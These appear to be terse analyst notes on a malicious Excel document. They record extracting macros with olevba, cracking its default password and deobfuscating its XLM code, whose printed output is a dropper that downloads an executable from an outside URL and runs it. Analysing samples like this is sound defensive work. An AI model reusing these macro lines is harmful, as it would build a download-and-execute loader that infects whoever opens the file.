1. Identify file as exel document.
2. Extract info with olevba which seems to be obfuscated.
3. There is a lot of RUN "looping". But the most interesting part is the lines extracting strings from the cell content
4. Carve password msoffcrypto-crack.py 18e6fdff29081616350af45e994c10bfdf5f42497de50b2402e4547681d1e8d9 
Password found: VelvetSweatshop
5. Try to deobfuscate xlm file5.
ks/8$ xlmdeobfuscator -p VelvetSweatshop --file 18e6fdff29081616350af45e994c10bfdf5f42497de50b2402e4547681d1e8d9 

Reveals :
CELL:GU763     , FullEvaluation      , CALL("Kernel32","CreateDirectoryA","JCJ","C:\RPJbYuR\pvrDGVq",0) CELL:GU764     , FullEvaluation      , CALL("URLMON","URLDownloadToFileA","JJCCJJ",0,"https://istitutobpascalweb.it/mynotescom/renoovohostinglilnuxadvanced.phRUN(todxofsEmlZLmJVjRiU!GU763)","C:\RPJbYuR\pvrDGVq\rCLGjyS.exe",0,0) CELL:GU765     , FullEvaluation      , CALL("Shell32","ShellExecuteA","JJCCCCJ",0,"Open","C:\RPJbYuR\pvrDGVq\rCLGjyS.exe",,0,0) CELL:GU766     , End                 , HALT() 
